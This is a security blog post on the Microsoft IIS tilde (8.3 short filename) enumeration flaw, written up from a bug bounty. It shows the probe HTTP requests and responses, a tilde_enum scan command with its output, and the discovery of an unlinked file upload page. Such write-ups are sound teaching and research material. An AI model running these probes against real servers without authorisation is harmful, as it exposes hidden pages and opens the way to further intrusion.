
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en">
    <head>
        <title>Digital Horror</title>
        <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- Load light and dark themes for syntax highlighting -->
<link id="prism-light-theme" href="/themes/prism-theme-github-light.css" rel="stylesheet" />
<link id="prism-dark-theme" href="/themes/prism-theme-github-dark.css" media="none" rel="stylesheet" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.27.0/prism.min.js"></script>

<!-- Load light and dark themes for overall layout -->
<link class="main-stylesheet" id="light-mode" rel="stylesheet" href="/css/styles.css">
<link class="main-stylesheet" id="dark-mode" rel="stylesheet" media="none" href="/css/styles-dark.css" />

<!-- Add webfont support -->
<link rel="stylesheet" href="/fonts/icons.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@mdi/font@latest/css/materialdesignicons.min.css">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Lato&family=Merriweather&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">

<script>
    function waitForElem(selector) {
        return new Promise(resolve => {
            if (document.querySelector(selector)) {
                console.log('element already exists');
                return resolve(document.querySelector(selector));
            }
    
            const observer = new MutationObserver(mutations => {
                if (document.querySelector(selector)) {
                    console.log('found element ' + selector);
                    resolve(document.querySelector(selector));
                    observer.disconnect();
                }
            });
    
            observer.observe(document.body, {
                  childList: true
                , subtree: true
                , attributes: false
                , characterData: false
            });
        });
    }
</script>

    </head>
    <body>
    <div class="container content-container">
        <header>
   <div class="header-content">
       <div class="header-center">
           <a href="/">Digital Horror</a>
       </div>
       <div class="header-right">
           <span id="dark-mode-toggle" class="mdi mdi-theme-light-dark"></span>
       </div>
   </div>
</header>



        <main>
            <article class="post">
            <h2 class="post-title">Microsoft IIS Tilde Enumeration - Legacy Nightmare</h2>
            <p class="post-date">07/07/2017</p>
                <div class = "post-content"> 
                <p>Recently during a bug bounty program I came across a particularly, &quot;rare&quot; vulnerability that often few people (myself included) don't quite understand. At first glance, the Microsoft IIS Tilde (~) Enumeration vulnerability seems like one of those cases where a feature is a bug (similar to <a href="https://web.archive.org/web/20190514192329/https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/">XXE</a>).</p>
<p>This article aims to dive deeper into the Windows filesystem, the enumeration vulnerability and it's impact on a web application.</p>
<blockquote>
<p><strong>Note</strong> â€” All the information here is from a live bug bounty and not a local test setup to display the vulnerability. Public disclosure has not yet been granted and thus any references to the actual web application have been omitted.</p>
</blockquote>
<hr />
<h2><a href="#feature-rich" aria-hidden="true" class="anchor" id="header-feature-rich"></a>Feature Rich</h2>
<p>When creating a new file on a Windows system, a short file name is generated using 8.3 format which can be seen when opening up your command prompt and running <code>dir /X</code> like so.</p>
<p><img src="../res/microsoft-iis-tilde-enumeration--legacy-nightmare/0lzbW4V.png" alt="" /></p>
<p>This might seem obvious and not so horrible at first glance. Let's tackle this from a different perspective. I originally had a file named fileupload-20170707-N6L7dR4KcA.aspx which in the 8.3 file format is translated to <code>FILEUP~1.ASP</code>. I can now access the resource whilst only having to guess 12 characters instead of 32 and thus <strong>greatly</strong> reduced the total number of combinations required!</p>
<p>Some of you may be asking, &quot;Why the short name?&quot;. The answer is essentially, to support old MS-DOS or 16-bit programs; this is the foundation for everything else that occurs throughout this article. That out of the way, enough with the boring stuff. Let's try to get a real target.</p>
<h2><a href="#the-target" aria-hidden="true" class="anchor" id="header-the-target"></a>The Target</h2>
<p>When an application is powered by ASP.NET there is a good chance that the vulnerability can be found in some form or another. The idea is to cause the application to give a different response for more or less the same resource. However to confirm that the resource exists, I ran two tests.</p>
<h3><a href="#first-test" aria-hidden="true" class="anchor" id="header-first-test"></a>First Test</h3>
<p>Check that the application will not respond differently when the file actually does not exist. Starting without the <code>~1</code> in the path.</p>
<h4><a href="#request" aria-hidden="true" class="anchor" id="header-request"></a>Request</h4>
<pre><code class="language-none">GET /nonexistent-random-file/ HTTP/1.1
Host: example.com
</code></pre>
<h4><a href="#response" aria-hidden="true" class="anchor" id="header-response"></a>Response</h4>
<pre><code class="language-none">HTTP/1.1 404 Not Found
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/html
X-Powered-By: ASP.NET
X-Frame-Options: SAMEORIGIN
</code></pre>
<p>So far so good, let's try the same thing using the <code>~1</code> instead.</p>
<h4><a href="#request-1" aria-hidden="true" class="anchor" id="header-request-1"></a>Request</h4>
<pre><code class="language-none">GET /nonexistent-random-file~1/ HTTP/1.1
Host: example.com
</code></pre>
<h4><a href="#response-1" aria-hidden="true" class="anchor" id="header-response-1"></a>Response</h4>
<pre><code class="language-none">HTTP/1.1 404 Not Found
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/html
X-Powered-By: ASP.NET
X-Frame-Options: SAMEORIGIN
</code></pre>
<p>Same response, which is what we are looking for here. Great, now moving on to the next stage.</p>
<h3><a href="#second-test" aria-hidden="true" class="anchor" id="header-second-test"></a>Second Test</h3>
<p>We know that the server will always respond with a <code>404 Not Found</code> when the file either in normal format or in 8.3 format does not exist. What happens when we try to access a file using 8.3 format that does exist? The server will respond with a <code>404 Not Found</code> if the resource does not exist, even if we use 8.3 format. Let's see what we can do to trigger another response.</p>
<h4><a href="#request-2" aria-hidden="true" class="anchor" id="header-request-2"></a>Request</h4>
<pre><code class="language-none">GET /fileup~1/ HTTP/1.1
Host: example.com
</code></pre>
<h4><a href="#response-2" aria-hidden="true" class="anchor" id="header-response-2"></a>Response</h4>
<pre><code class="language-none">HTTP/1.1 200 OK
Connection: close
Cache-Control: no-cache
Content-Type: text/html; charset=utf-8
Pragma: no-cache
Content-Length: 576
</code></pre>
<p>Bang! The site returned a 200 OK but still told us that the request was rejected:</p>
<p><em>Error with your request</em></p>
<p>That's great, we managed to get a different response which means there is something lingering in there.</p>
<h2><a href="#extending-the-discovery" aria-hidden="true" class="anchor" id="header-extending-the-discovery"></a>Extending the Discovery</h2>
<p>Testing all of this manually is monkey's work. Let's use an automated tool such as <a href="https://web.archive.org/web/20190514192329/https://github.com/WebBreacher/tilde_enum">tilde_enum</a> (used Python v2.7.11) instead to see if it finds anything juicy.</p>
<p>We need to first download a WORDLIST for the scanner to use. I happened to use the following <a href="https://web.archive.org/web/20190514192329/https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web_Content/raft-small-words-lowercase.txt">list</a>. Kicking off the scan.</p>
<pre><code class="language-cmd">C:\tmp\tilde_enum-master&gt;&quot;C:/Python27/python&quot; tilde_enum.py -u https://example.com/ -w raft-small-words-lowercase.txt -f
[-] Testing with dummy file request https://example.com/PLb4ftIiaW.htm
[-] URLNotThere -&gt; HTTP Code: 404, Response Length: 1245
[-] Testing with user-submitted https://example.com/
[-] URLUser -&gt; HTTP Code: 200, Response Length: 3775
[!] You have used the -f switch to force us to scan. Well played. Using the IIS/6 &quot;*~1*/.aspx&quot; string.
[+] Found a directory: advert
[+] Found a directory: app_of
[+] Found a directory: aspnet
[+] Found a directory: associ
[+] Found a directory: buyers
[+] Found a directory: commit
[+] Found a directory: confer
[+] Found a directory: errorp
[+] Found a directory: fileup
[+] Found a directory: fundra
[+] Found a directory: leader
[+] Found file: logo-2 . jpg
[+] Found a directory: mainte
[+] Found a directory: member
[+] Found a directory: messag
[+] Found a directory: resour
[+] Found a directory: subscr
[+] Found a directory: testlo
[+] Found a directory: webbac
[+] Found a directory: webpor
[-] Finished doing the 8.3 enumeration for /.
</code></pre>
<p>This is only a subset of the entire scan however we already found something juicy in there. From the list I can see filup which as most of you have already guessed, maps to <code>fileupload.aspx</code>. Let's find out.</p>
<p>Sending the first request to <code>fileup~1</code> like we saw before also return a <code>200 OK</code> along with the response.</p>
<p><img src="../res/microsoft-iis-tilde-enumeration--legacy-nightmare/rpGofln.png" alt="" /></p>
<p>Let's try accessing the file directly using <code>fileupload.aspx</code> instead and see if it responds with the actual file.</p>
<p><img src="../res/microsoft-iis-tilde-enumeration--legacy-nightmare/A5h4l7f.png" alt="" /></p>
<p>Looks like we just scraped the tip of the iceberg! A random file upload page that isn't linked anywhere in the web application but can be accessed directly; definitely juicy.</p>
<h2><a href="#conclusion" aria-hidden="true" class="anchor" id="header-conclusion"></a>Conclusion</h2>
<p>That is all with regards to the Microsoft IIS Tilde Enumeration vulnerability. Below are some references and resources that would help you learn further and into more detail should you wish to.</p>
<p>The vulnerability itself may not seem scary alone but it could definitely expose some sensitive pages or directories to chain into another attack.</p>
<hr />
<h2><a href="#resources" aria-hidden="true" class="anchor" id="header-resources"></a>Resources</h2>
<ul>
<li><a href="https://www.acunetix.com/blog/web-security-zone/windows-short-8-3-filenames-web-security-problem/">https://www.acunetix.com/blog/web-security-zone/windows-short-8-3-filenames-web-security-problem/</a></li>
<li><a href="http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf">http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf</a></li>
<li><a href="https://github.com/WebBreacher/tilde_enum">https://github.com/WebBreacher/tilde_enum</a></li>
</ul>

                </div>
            </article>
        </main>
    </div>

    <footer>
   <div class="footer-content">
       <div class="footer-center">
           &copy; 2023 Digital Horror. All rights reserved.
       </div>
       <div class="footer-right">
           <a href="https://linkedin.com/in/juxhin-db" target="_blank" rel="noopener noreferrer" class="social-icon">
               <span class="mdi mdi-linkedin"></span>
           </a>
           <a href="https://twitter.com/juxhindb" target="_blank" rel="noopener noreferrer" class="social-icon">
               <span class="mdi mdi-twitter"></span>
           </a>
           <a href="https://github.com/juxhindb" target="_blank" rel="noopener noreferrer" class="social-icon">
               <span class="mdi mdi-github"></span>
           </a>
       </div>
   </div>
</footer>



    <script src="/js/script.js" defer></script>
    <script src="/js/prism.js" defer></script>

    </body>
</html>
        